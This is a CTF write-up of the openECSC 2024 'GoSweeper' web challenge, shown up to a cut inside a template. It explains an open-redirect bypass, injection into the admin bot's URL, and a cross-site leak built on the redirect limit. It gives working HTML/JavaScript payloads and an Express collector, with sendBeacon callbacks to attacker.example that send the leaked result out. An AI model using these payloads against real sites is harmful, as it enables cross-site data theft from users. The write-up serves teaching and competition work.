+++
title = "openECSC 2024 Round 2 Write-up: GoSweeper"

[taxonomies]
tags = ["ctf", "ctf-writeup", "web", "golang", "xsleaks"]

[extra]
preface = """
_This write-up was placed in the top 3 of the best write-up competition for
openECSC 2024 Round 2, and is now
[published on their website](https://ecsc2024.it/openECSC/round-2/writeups/gosweeper)
as well._

---
"""
+++

This is a write-up of the "GoSweeper" challenge from Round 2 of openECSC 2024.
This challenge gives us a glimpse of side channels on the web, which allow
us to infer information which we otherwise would not have access to.

<!-- more -->

This class of vulnerabilities is called Cross-Site Leaks (or more commonly, [XSLeaks]),
and, sorry for the spoiler, is what we will be taking advantage of in order to get
the flag.

This write-up will be an insight into how I approached this problem and successfully
solved it, taking way more time than I would like to admit.
With that said, there is a lot of Minesweeper gameplay ahead of us, but first, we have
to dissect the source code that is given to us.

_Throughout this write-up, the URLs of the challenge and the attacker-controlled website
are referred to as `https://gosweeper.example` and `https://attacker.example` respectively._

## The Challenge

Let's start by taking a look at the challenge, which provides us with a zip file and
a challenge URL.

Upon loading the URL, we are greeted with a landing page where we can either login or
register.
Clicking the register button immediately creates a new user and shows us its ID
(a 128-bit hex string).
Going back to the landing page reveals a counter of games won (along with total games),
as well as a play button.
Starting a new game reveals a 7x7 board without any initial discovered tiles, as well
as two buttons under it, "Check win" and "Admin check".
Easy enough, I thought, I have played a lot of Minesweeper before.
After playing a few games, I came to the conclusion that guessing the first tile correctly
is quite difficult, and winning the game is borderline impossible, since there are multiple
50/50 situations.
Additionally, there seemed to be a lot of mines, more than you would expect for a board that
small.

{{ img(caption="Top left: landing page; Top center: register success page; Top right: logged-in home page; Bottom: board page", path="./gosweeper-interface.png") }}

Having gotten a grasp of the web interface, it is now time to look into the source code
that was given to us.
Extracting the zip archive reveals that it contains a Docker setup (thanks) and a
Golang application consisting of a single Go file and multiple HTML templates.

```
.
├── docker-compose.yml
├── Dockerfile
├── README.md
└── src
   ├── go.mod
   ├── go.sum
   ├── main.go
   └── templates
      ├── board.html
      ├── clone.html
      ├── header.html
      ├── home.html
      ├── login.html
      └── register.html
```

I have to preface the rest of this write-up by saying that I have little to no experience
with Golang, but the challenge code is quite easy to read, and fortunately no weird
Go shenanigans were required (I'm thankful for sane languages sometimes; looking at you
JavaScript).

My first instinct when approaching web challenges with source is to _grep_ for the flag,
which usually gives us a very good overview of the direction we need to take.
This challenge is no different, and we found the following in the Go file:

```go, hl_lines=9
var FLAG string = os.Getenv("FLAG")
// ...

func homeHandler(w http.ResponseWriter, r *http.Request) {
  userid, points, tries, err := getUserAndPoints(r)
  // ...

  flag := ""
  if points >= 20 && points == tries {
    flag = FLAG
  }

  data := struct {
    // ...
    Flag   string
  }{
    // ...
    Flag:   flag,
  }

  renderTemplate(w, "home.html", data)
}
```

It seems like the flag is shown in the home page once we reach 20 _perfect_ wins,
which as mentioned before, is borderline impossible by just playing the game.
Great.

After quickly going through the source code, I found two important pieces of
information: how the board is generated and what the "Admin check" button does.

The function that generates the board is quite long, but here is a small recap
of the algorithm:
1. Randomly pick a position on the board to be the first bomb.
2. Pick another random position on the board, and if is next to a bomb (orthogonally;
   diagonally does not count), place a bomb there.
3. Repeat the previous step until half of the board is composed of bombs, that is,
   until there are 25 bombs in the board.
4. Mark all safe spots neighboring more than 6 bombs as bombs as well (for sides
   the threshold is more than 3 bombs, while for corners it is more than 2),
   preventing a single safe spot surrounded by bombs.

<details>
<summary>Full board generation code</summary>

```go
func GenerateBoard() []int {
  board := make([]int, DIM*DIM)

  firsBombX := randInt(0, 1) * (DIM - 1)
  firsBombY := randInt(0, 1) * (DIM - 1)

  firsBombInd := firsBombX*DIM + firsBombY

  board[firsBombInd] = 100

  // put bombs around the first bomb
  for i := 0; i < (DIM * DIM / 2); i++ {

    // get random position
    randPos := randInt(0, DIM*DIM-1)

    // check if the position is already a bomb
    if board[randPos] == 100 {
      i--
      continue
    }

    // check if the position is close to another bomb

    // get x and y of the random position
    randX := randPos / DIM
    randY := randPos % DIM

    // check up
    nearBomb := false

    if randX > 0 && board[randPos-DIM] == 100 {
      nearBomb = true
    }
    if randX < (DIM-1) && board[randPos+DIM] == 100 {
      nearBomb = true
    }
    if randY > 0 && board[randPos-1] == 100 {
      nearBomb = true
    }
    if randY < (DIM-1) && board[randPos+1] == 100 {
      nearBomb = true
    }

    if nearBomb {
      board[randPos] = 100
    } else {
      i--
    }
  }

  changed := true

  for changed {
    changed = false

    // Fill the rest of the board with the number of bombs around
    for i := 0; i < DIM*DIM; i++ {
      if board[i] == 100 {
        continue
      }

      x := i / DIM
      y := i % DIM

      count := 0

      if x > 0 {

        // check up
        if board[i-DIM] == 100 {
          count++
        }
        // check up left
        if y > 0 && board[i-(DIM+1)] == 100 {
          count++
        }
        // check up right
        if y < (DIM-1) && board[i-(DIM-1)] == 100 {
          count++
        }
      }
      if x < (DIM - 1) {

        // check down
        if board[i+DIM] == 100 {
          count++
        }
        // check down left
        if y > 0 && board[i+DIM-1] == 100 {
          count++
        }
        // check down right
        if y < (DIM-1) && board[i+DIM+1] == 100 {
          count++
        }
      }
      // check left
      if y > 0 && board[i-1] == 100 {
        count++
      }
      // check right
      if y < (DIM-1) && board[i+1] == 100 {
        count++
      }

      if count > 6 || ((y == 0 || y == (DIM-1) || x == 0 || x == (DIM-1)) && count > 3 || ((x == 0 || x == (DIM-1)) && (y == 0 || y == (DIM-1))) && count > 2) {
        // fmt.Println("Count: ", count)
        // fmt.Println("Pos: ", i)
        board[i] = 100
        changed = true
        break
      }

      board[i] = count
    }
  }

  bombs := 0
  for i := 0; i < DIM*DIM; i++ {
    if board[i] == 100 {
      bombs++
    }
  }

  // log.Printf("Generated board with %d%% bombs", bombs*100/(DIM*DIM))

  return board
}
```

</details>

This results in the following game mechanics:

- Bombs make up 50%-60% of the board;
- The center of the board is nearly always a bomb;
- There is usually a "safe" side, where the bombs don't spread to;
- All the bombs are connected to each other, which means there are no bombs
  isolated from the rest of the bombs (this helps decisions on 50/50 situations
  where one option could have never been generated by this function);
- There can, however, still exist safe spots isolated from each other.

These mechanics will be important in the future, so keep them in mind.

{{ img(caption="Admin X-ray view, where it is possible to see the board without solving it", path="./xray-view.png") }}

Finally, before delving into the exploitation of this app, let's take a look
at what the "Admin check" button does.
When clicked, it creates a new admin account and invokes a headless Chromium
browser that performs the following actions:
1. Login as the admin
2. Sleep for 1 second
3. Clone the board of the user
4. Sleep for 1 second
5. Open the board of the user with the `xray` option (shows where the bombs are)
6. Sleep for 4 seconds

```go
func checkBoardHandler(w http.ResponseWriter, r *http.Request) {
  // ...
  data := struct {
    Actions []interface{} `json:"actions"`
    Browser string        `json:"browser"`
  }{
    Actions: []interface{}{
      map[string]string{
        "type": "request",
        "url":  CHALL_URL + "/login",
      },
      map[string]string{
        "type":    "type",
        "element": "#userid",
        "value":   botUserId,
      },
      map[string]string{
        "type":    "click",
        "element": "#submitbtn",
      },
      map[string]interface{}{
        "type": "sleep",
        "time": 1,
      },
      map[string]string{
        "type": "request",
        "url":  CHALL_URL + "/clone?cloneid=" + cloneid,
      },
      map[string]interface{}{
        "type": "sleep",
        "time": 1,
      },
      map[string]string{
        "type": "request",
        "url":  CHALL_URL + "/board?xray=1",
      },
      map[string]interface{}{
        "type": "sleep",
        "time": 4,
      },
    },
    Browser: "chrome",
  }
  // ...
}
```

Additionally, further inspection of the clone endpoint reveals that each board
can only be cloned up to 5 times, which is reset when a new game is started.

This gives us a very strong hint that we must somehow take advantage of the bot
to extract information about our own game.

## Investigating Attack Vectors

Now that we have an overview of the challenge, we need to figure out which
attack vectors exist.

### Cross-Site Scripting (XSS)

Scrolling through the code, the first thing that catches my attention is this
middleware setting certain security headers.
Interestingly, the [CSP header] seems to be commented out, so I thought there
might be some kind of XSS that we have to exploit.

```go, hl_lines=11-12
func securityHeadersMiddleware(next http.Handler) http.Handler {
  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    // Set security headers
    // https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
    w.Header().Set("X-Frame-Options", "DENY")
    w.Header().Set("X-XSS-Protection", "0")
    w.Header().Set("X-Content-Type-Options", "nosniff")
    w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
    w.Header().Set("Content-Type", "text/html; charset=UTF-8")
    w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
    // I have some inline scripts in the templates, who cares about CSP anyway
    // w.Header().Set("Content-Security-Policy", "script-src 'self';")
    w.Header().Set("Cross-Origin-Opener-Policy", "same-origin")
    w.Header().Set("Cross-Origin-Embedder-Policy", "require-corp")
    w.Header().Set("Cross-Origin-Resource-Policy", "same-site")
    w.Header().Set("Permissions-Policy", "geolocation=(), camera=(), microphone=()")

    next.ServeHTTP(w, r)
  })
}
```

However, it seems like the challenge author was just lazy (or wanted to throw us off),
because looking through the HTML templates did not show anything promising.
There doesn't seem to be any variable that we control; the only data we can directly change
is the board itself, which is encoded as an integer array, meaning there is no way to
inject a string there.

### Server-Side Template Injection (SSTI)

Since there were HTML templates involved, I then looked into the function that handles
their rendering, hoping to find a vulnerability there.
While it seemed secure at first glance, as I am not very experienced with Go I looked
up SSTI examples in Go to make sure it was sound.

```go
func renderTemplate(w http.ResponseWriter, templateFile string, data interface{}) {
  // Parse the template file
  tmpl, err := template.New(templateFile).Funcs(template.FuncMap{"mod": func(i, j int) int { return i % j }}).ParseFiles("templates/"+templateFile, "templates/header.html")
  if err != nil {
    log.Println(err)
    http.Error(w, "Internal Server Error", http.StatusInternalServerError)
    return
  }

  // Execute the template with the data
  err = tmpl.Execute(w, data)
  if err != nil {
    log.Println(err)
    http.Error(w, "Internal Server Error", http.StatusInternalServerError)
    return
  }
}
```

Similarly to XSS, there doesn't seem to be anything exploitable here, since we don't
control the `templateFile` variable.

### Redirect Middleware

However, one middleware caught my attention, since it handles user input.
This middleware is responsible for redirecting the user, upon login, to the link
pointed by the `redirect` query parameter.
This means that the URL `https://gosweeper.example?redirect=/board` would redirect
any logged in user to `/board`.

```go, hl_lines=12 22
func redirectMiddleware(next http.Handler) http.Handler {
  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    urlto := r.URL.Query().Get("redirect")
    if urlto != "" {
      // check if the user is authenticated
      // ...

      a, err := url.Parse(urlto)

      if err == nil {
        // accept only http and https or relative url
        if a.Scheme != "" && a.Scheme != "http" && a.Scheme != "https" {
          http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
          return
        }

        fmt.Println("Scheme: ", a.Scheme)
        fmt.Println("Host: ", a.Host)
        fmt.Println("HOST CHALL: ", r.Host)

        // only accept same host
        if a.Scheme != "" && a.Host != r.Host {
          http.Error(w, "URL parameter is invalid", http.StatusBadRequest)
          return
        }
      }

      if err != nil {
        log.Println(err)
      }

      http.Redirect(w, r, urlto, http.StatusFound)
      return
    }
    next.ServeHTTP(w, r)
  })
}
```

As we can see from the code, there are certain checks in place to make
sure this is either a relative URL or an absolute URL matching the challenge
origin (i.e., `gosweeper.example`).
Despite this, it is still possible to bypass these protections, since browsers
interpret an URL starting with double slashes as absolute, but it does not
have any scheme (i.e., its scheme is inferred from the scheme of the current
website).
For this reason, the URL `https://gosweeper.example.com?redirect=//attacker.example`
causes a redirect to `https://attacker.example`.
Now we just need to find a way to take advantage of this behaviour...

### Admin Bot

Further inspection of the aforementioned admin check feature reveals that we control
part of one of the URLs the bot (headless Chromium browser) visits.

```go, hl_lines=12 39
func checkBoardHandler(w http.ResponseWriter, r *http.Request) {
  // ...

  // Parse the form
  err = r.ParseForm()
  if err != nil {
    log.Println(err)
    http.Error(w, "Internal Server Error", http.StatusInternalServerError)
    return
  }

  cloneid := r.PostFormValue("cloneid")

  if cloneid == "" {
    s, err := sessionStore.Get(r, "session")
    if err != nil {
      log.Println(err)
      http.Error(w, "Internal Server Error", http.StatusInternalServerError)
      return
    }

    cloneid, _ = s.Values["userid"].(string)

    if cloneid == "" {
      http.Error(w, "Bad Request", http.StatusBadRequest)
      return
    }
  }

  // Call the bot
  data := struct {
    Actions []interface{} `json:"actions"`
    Browser string        `json:"browser"`
  }{
    Actions: []interface{}{
      // ...
      map[string]string{
        "type": "request",
        "url":  CHALL_URL + "/clone?cloneid=" + cloneid,
      },
      // ...
    },
    Browser: "chrome",
  }

  // ...
}
```

The endpoint accepts a `cloneid` parameter given in the POST request's body,
which if empty just defaults to the ID of the current user.
This parameter is then passed as a query parameter to a URL the bot visits,
but with no escaping whatsoever.
This means that we can pass additional query parameters (e.g., the aforementioned
`redirect` parameter) and get the bot to visit our own website, simply by sending
`cloneid=something&redirect=//attacker.example` in the body of the request.

We can see this in action by sending a request using the following code in the
browser's console (or using your favourite HTTP client) and taking a look at the
headless Chromium's logs:

```js
fetch(`/checkboard`, {
  method: 'POST',
  body: new URLSearchParams({
    cloneid: 'something&redirect=//attacker.example',
  }),
});
```

```hl_lines=17
[INFO] time=4
[INFO] Sleeping for 4 seconds...
[DEBUG] What follows is a list of all the requests which have been performed by the browser:
[DEBUG]   - 200 https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard
[DEBUG]   - 200 https://update.googleapis.com/service/update2/json?cup2key=13:uZY9aaXIKQsxzpLXZabR1vcg_15CqJ1jrffybVm5VM8&cup2hreq=0bc0f2ab95433858138f92c381c78020f721e52187712d7bfbc035c0241f9914
[DEBUG]   - 200 http://edgedl.me.gvt1.com/edgedl/chromewebstore/L2Nocm9tZV9leHRlbnNpb24vYmxvYnMvYTBmQUFZUHRkSkgtb01uSGNvRHZ2Tm5HQQ/1.0.0.15_llkgjffcdpffmhiakmfcdcblohccpfmo.crx
[DEBUG]   - 200 https://update.googleapis.com/service/update2/json
[DEBUG]   - 200 https://update.googleapis.com/service/update2/json?cup2key=13:wAPwclgoQoguPMBkA2lMUoNigyPGWWCOkZ1lzJVrdWo&cup2hreq=9fbcdeebd981821a4d766860571b378f3bb9d80d5bf8acecc0c112c631bf5314
[DEBUG]   - 200 https://gosweeper.example/login
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 404 https://gosweeper.example/favicon.ico
[DEBUG]   - 200 https://content-autofill.googleapis.com/v1/pages/ChNDaHJvbWUvMTIyLjAuNjI0OC4wEhkJqFiiaKxoaTESBQ2jwhVDIeiPPZAbjv6B?alt=proto
[DEBUG]   - 302 https://gosweeper.example/login
[DEBUG]   - 200 https://gosweeper.example/
[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&redirect=//attacker.example
[DEBUG]   - 200 https://attacker.example/
[DEBUG]   - 302 https://gosweeper.example/board?xray=1
[DEBUG]   - 302 https://gosweeper.example/newboard
[DEBUG]   - 200 https://gosweeper.example/board
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
```

It is also worth noting that, as evidenced by the request to `/newboard`,
the board isn't being cloned, since the redirect middleware runs before the
actual endpoint handler.

## Taking Control of the Admin Bot

Now that we can get the bot to visit our website (at least for 1 second), we
need to figure out what to do with this capability.
There are multiple interesting pieces of information that would be helpful
to get ahold of, such as the bot ID (which has unlimited X-ray access) or the
board in the X-ray view.
Unfortunately, there are various countermeasures put in place (mainly by the browser)
to make sure we cannot access this information:

- No [Cross-Origin Resource Sharing (CORS) header][cors-header] is present, which
  means that, while we are able to make requests to `https://gosweeper.example`,
  the browser does not allow us to read anything from the response
  (including its status code);
- Additionally, the cookie's `SameSite` attribute is unset, which
  [defaults to `Lax`][cookie-lax].
  This means that while we can make requests, they will be unauthenticated, which
  is rather useless.
  The only requests that are authentication are top-level navigations, that is,
  changing the page URL to that of `https://gosweeper.example/...`;
- Other security headers are also present, such as the
  [Cross-Origin Opener Policy (COOP) header][coop-header] and the
  [Cross-Origin Resource Policy (CORP) header][corp-header].
  The former prevents an attacker from opening a pop-up and keeping a reference
  to its window object, while the latter prevents any webpage from loading
  resources from the challenge's origin (e.g., images).
  None of these cause significant headaches, since for the former the browser
  already prevents cross-origin accesses to the DOM, and for the latter
  the lax cookie policy prevents the cookies from being sent at all.

Fortunately for us, there is still something we can use to make authenticated
requests to GoSweeper, even if we cannot (directly) obtain any information:
`window.open`.
While on a user-controlled browser pop-ups are blocked by default, **on headless
Chromium they are allowed**, so we can open as many new tabs as we want.
This is useful, for example, to actually clone the board, which only requires
a GET request.
The following attacker payload would result in getting the bot to clone the board
as it was supposed to do before we forced a redirect, since it opens a new tab
(top-level navigation) which includes the authentication cookie.

```html
<script>
window.open("https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd");
</script>
```

Alternatively, and perhaps more flexibly, we can also use HTML forms, which
allow us to do POST requests as well.
As such, the example above can be rewritten as (notice `target="_blank"` in the
form HTML to open it in a new tab):

```html
<form id="form-clone" method="get" action="https://gosweeper.example/clone" target="_blank">
  <input type="hidden" name="cloneid" value="fe24ecea6cf48d9604127b1204bb24fd" />
</form>

<script>
  document.getElementById('form-clone').submit();
</script>
```

We can see from the browser logs that the bot indeed successfully clones the board,
since the request to `/board?xray=1` no longer redirects to `/newboard`!

```hl_lines=5 8
[DEBUG] What follows is a list of all the requests which have been performed by the browser:
// ...
[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&redirect=//attacker.example
[DEBUG]   - 200 https://attacker.example/
[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
[DEBUG]   - 404 https://attacker.example/favicon.ico
// ...
[DEBUG]   - 200 https://gosweeper.example/board?xray=1
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
```

Now that we have successfully cloned the board, while still having an open tab
with our malicious website open, we can try to make certain requests in order
to hopefully extract information about the state of the board.
Given that all traditional methods of getting information (e.g., sending a request
using `fetch`) are blocked, we are left with just one option: side channels.

### XSLeaks

As previously mentioned, side channels on the web are commonly referred to as
Cross-Site Leaks ([XSLeaks]), and they allow an attacker (us) to infer information
present in another origin (GoSweeper).
Going through the XSLeaks Wiki reveals a number of approaches one could take,
which mainly rely on having the website and/or browser exhibit
different behaviour based on the state of the board.

To take advantage of this, we first need to find a scenario in which a request
is handled differently depending on certain actions.
The challenge gives us the hint that we might not be able to get the whole board
at once, since we are limited to 5 clones per board.
Therefore, it is likely that we will only be able to infer whether a certain
tile is a bomb.

Upon inspecting the source code again, and recalling the already observed
behaviour, the `/board` endpoint stands out as a good candidate, since it causes
a redirect to `/newboard` if there isn't an active game (i.e., right after
we lose).
This redirect behaviour can be detected by
[exhausting the browser's redirect limit][max-redirects], which will cause an error
if `/board` redirects, but proceed normally otherwise.
More concretely, the Chromium browser has a limit of 20 redirects (in one go);
if we perform 19 redirects somewhere else and then redirect to `/board`, we
are able to know if the logged in user has an active game or not.

For this side channel to be useful, we first need a way to manipulate the state
in a way that will give us relevant information.
To achieve this, we can make a guess on a tile (using the `/guess` endpoint):
if that guess is a bomb, the game will end and the bot user will not have
an active game anymore; otherwise, the tile will be revealed and nothing else
will happen.
Using this, we now have a clear way to figure out whether a given tile is a bomb
(i.e., an oracle).

So, recapping the plan:

1. Clone the board using the admin bot;
2. Make the bot take a guess on the tile we want to reveal;
3. Make the bot navigate to the board page and detect whether there is an active
   game, revealing the contents of the guessed tile;
4. Send this information back to us.

These are a lot of actions to take in just one second (and the redirects, especially,
seem to take a lot of time to execute in the headless browser), so we need a way
to persist after that.
Thankfully, this is not very difficult, since we can just open a new tab from
the initial page, giving us another 4 seconds until the browser is killed:

```html, hl_lines=7
<form id="form-clone" method="get" action="https://gosweeper.example/clone" target="_blank">
  <input type="hidden" name="cloneid" value="fe24ecea6cf48d9604127b1204bb24fd" />
</form>

<script>
  document.getElementById('form-clone').submit();
  window.open('/persist.html');
</script>
```

Since we are doing further requests mutating the state of the board, we need to
wait for the `/board?xray=1` request to be sent first, otherwise it would generate
a new board if the tile we are guessing is a bomb, rendering the side channel useless.
My first approach for this was to use `setTimeout`, waiting a certain number of milliseconds,
but this proved to be quite unreliable, since the time the new tab takes to load can vary.
To combat this problem, I injected an event handler in the "main" tab that would tell
this new `/persist.html` tab that it was navigating somewhere else
(i.e., the deprecated [`unload` event][unload-event]).
This is only possible because both pages are from the same origin (i.e., `https://attacker.example`),
so [`window.opener`][window-opener] in the second tab points back to the first one and is able
to interact with it.

As such, this is what our `persist.html` looks like now, making a guess on tile 0 (the top-left corner)
after the bot navigates away from its opener:

```html
<form id="form-guess" method="post" action="https://gosweeper.example/guess" target="_blank">
  <input type="hidden" name="guess" value="0" />
</form>

<script>
  window.opener.onunload = () => {
    document.getElementById('form-guess').submit()
    // TODO
  }

</script>
```

Again, looking at the headless Chromium bots reveals that this is working as intended, with the
request to `/guess` being sent immediately after the one sent to `/board?xray=1`.

```hl_lines=10-11
[DEBUG] What follows is a list of all the requests which have been performed by the browser:
// ...
[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&redirect=//attacker.example
[DEBUG]   - 200 https://attacker.example/
[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
[DEBUG]   - 200 https://attacker.example/persist.html
[DEBUG]   - 404 https://attacker.example/favicon.ico
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 200 https://gosweeper.example/board?xray=1
[DEBUG]   - 200 https://gosweeper.example/guess
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
```

The only thing left now is to detect whether there is still an active game after making
the guess.
Since we cannot use `fetch`, given that it would not include a cookie, we have to rely
on opening a new tab once again.
Here, an interesting behaviour emerges: if we reach the maximum number of redirects,
the window's origin will be `about:blank`, which is accessible from any origin;
otherwise, the origin will be `https://gosweeper.example` and we will not be able
to access any content of the window.
Therefore, to know if a redirect is successful or not, we just have to poll
the `w.window` object and check if it becomes null; if it does, we have lost access
to the window reference, meaning the redirect was successful (and there is no bomb).

In order to achieve the 19 redirects (well, 18, since opening the new tab also counts
as a redirect, apparently) before the final destination, we can use
[XSLeaks' own demo service][max-redirect-demo], which provides us with the
`https://xsinator.com/testcases/files/maxredirect.php?n=18&url=<url>` endpoint
(I've tried creating my own with Caddy, but it ended up not being reliable in the
challenge's instance).

```html, hl_lines=14
<form id="form-guess" method="post" action="https://gosweeper.example/guess" target="_blank">
  <input type="hidden" name="guess" value="0" />
</form>

<form id="form-redirect" method="get" action="https://xsinator.com/testcases/files/maxredirect.php" target="redirect-window">
  <input type="hidden" name="n" value="18" />
  <input type="hidden" name="url" value="https://gosweeper.example/board" />
</form>

<script>
  const sleep = t => new Promise((resolve) => setTimeout(resolve, t));

  const callback = w => {
    const result = w.window == null ? 'safe' : 'bomb';
    navigator.sendBeacon(`https://attacker.example/callback/${result}`);
  }

  let w = window.open('', 'redirect-window');

  const leak = async () => {
    document.getElementById('form-redirect').submit();
    await sleep(2500);
    callback(w);
    await sleep(100);
    callback(w);
    await sleep(100);
    callback(w);
    // (repeat a few times)
  };

  window.opener.onunload = () => {
    document.getElementById('form-guess').submit()
    leak();
  }
</script>
```

Notice some optimisations that were made in order to make sure we always™ get the
correct result:
- A new tab is open as soon as the page is loaded, even before the `window.opener.onunload`
  event handler is fired, in order to reduce the time it takes to initiate the request of
  the redirects;
- The redirects are _slow_, so starting them at the same time as the guess is not a problem
  and also helps with making sure it finishes within the 4 seconds that we have;
- We first wait 2.5 seconds after sending back the status of the window, but in some cases
  this might not be enough time for all the redirects to finish, so we keep sending requests
  at 100ms intervals afterwards (until the browser process is abruptly terminated).

This correctly identifies whether the tile is a bomb.
Here is a log of the request in case of a bomb:

```hl_lines=17 22 23
[DEBUG] What follows is a list of all the requests which have been performed by the browser:
// ...
[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&redirect=//attacker.example
[DEBUG]   - 200 https://attacker.example/
[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
[DEBUG]   - 200 https://attacker.example/persist.html
[DEBUG]   - 404 https://attacker.example/favicon.ico
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 200 https://gosweeper.example/board?xray=1
[DEBUG]   - 200 https://gosweeper.example/guess
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=18&url=https%3A%2F%2Fgosweeper.example%2Fboard
// ...
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=4&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 200 https://attacker.example/callback/bomb
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=3&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=2&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=1&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=0&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://gosweeper.example/board
[DEBUG]   - 200 https://attacker.example/callback/bomb
```

And here is the same thing when it is a safe spot:

```hl_lines=17 22 25
[DEBUG] What follows is a list of all the requests which have been performed by the browser:
// ...
[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&redirect=//attacker.example
[DEBUG]   - 200 https://attacker.example/
[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
[DEBUG]   - 200 https://attacker.example/persist.html
[DEBUG]   - 404 https://attacker.example/favicon.ico
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 200 https://gosweeper.example/board?xray=1
[DEBUG]   - 200 https://gosweeper.example/guess
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=18&url=https%3A%2F%2Fgosweeper.example%2Fboard
// ...
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=4&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 200 https://attacker.example/callback/bomb
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=3&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=2&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=1&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 302 https://xsinator.com/testcases/files/maxredirect.php?n=0&url=https%3A%2F%2Fgosweeper.example%2Fboard
[DEBUG]   - 200 https://gosweeper.example/board
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
[DEBUG]   - 200 https://attacker.example/callback/safe
```

Awesome! Now we just need to put this together to be able to quickly know
whether any tile of our choosing is a bomb.

## Tying It All Together

To more efficiently trigger the bomb oracle, we can create a Node.js app using
[Express] and [Mustache] that receives the tile to be explored through the
redirect, and prints the outcome of the callback:

```js
import express from 'express';
import mustacheExpress from 'mustache-express';

const CHALL_HOST = "https://gosweeper.example";
const CALLBACK_URL = "https://attacker.example/xsleaks-callback";

const userId = "fe24ecea6cf48d9604127b1204bb24fd";

const app = express();
const port = 3000;

app.engine("mustache", mustacheExpress());

app.set('views', "./templates");
app.set('view engine', 'mustache');

app.get('/entry/:tile', (req, res) => {
  const { tile } = req.params;
  res.render("entry", { CHALL_HOST, userId, tile });
});

app.get('/xsleaks/:tile', (req, res) => {
  const { tile } = req.params;
  res.render("xsleaks", { CHALL_HOST, CALLBACK_URL, tile });
});

app.post('/xsleaks-callback/:result', (req, res) => {
  const { result } = req.params;
  console.log(result);
  res.status(200);
  res.end();
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
```

<details>
<summary>Mustache templates</summary>

`templates/entry.mustache`:

```html
<form id="form-clone" method="get" action="{{CHALL_HOST}}/clone" target="_blank">
  <input type="hidden" name="cloneid" value="{{userId}}" />
</form>

